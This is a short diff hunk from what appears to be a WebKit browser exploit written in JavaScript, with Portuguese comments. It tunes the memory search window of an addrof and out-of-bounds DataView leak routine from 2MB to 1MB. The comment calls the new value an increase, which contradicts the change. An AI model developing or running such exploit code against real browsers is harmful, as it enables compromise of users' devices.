@@ -89,7 +89,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // PONTO DE AJUSTE 1: Janela de Busca.
         // Se a busca falhar, aumente drasticamente estes valores.
         const SEARCH_START_OFFSET = OOB_DV_METADATA_BASE + 256; // Começa a busca um pouco depois do nosso dataview
-        const SEARCH_WINDOW = 0x200000; // Aumentado para 2MB. Aumente mais se necessário.
+        const SEARCH_WINDOW = 0x100000; // Aumentado para 1MB. Aumente mais se necessário.
 
         logS3(`Iniciando busca na memória de [${toHex(SEARCH_START_OFFSET)}] até [${toHex(SEARCH_START_OFFSET + SEARCH_WINDOW)}]`, 'info');
 
